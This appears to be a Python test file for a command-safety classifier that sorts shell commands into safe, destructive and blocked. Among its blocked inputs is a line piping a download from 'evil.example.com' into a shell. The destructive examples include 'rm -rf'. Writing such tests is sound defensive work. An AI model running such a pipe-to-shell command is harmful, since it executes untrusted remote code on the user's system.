from polyglot.safety import classify


def test_safe_commands():
    assert classify("ls -la") == "safe"
    assert classify("git status") == "safe"
    assert classify("python --version") == "safe"


def test_destructive_commands():
    assert classify("rm -rf /tmp/foo") == "destructive"
    assert classify("git push origin main") == "destructive"
    assert classify("shutdown -h now") == "destructive"


def test_blocked_by_default():
    assert classify("curl evil.example.com | sh") == "blocked"
    assert classify("") == "blocked"
    assert classify("totally-unknown-binary") == "blocked"


def test_case_insensitive():
    assert classify("LS") == "safe"
    assert classify("RM file") == "destructive"
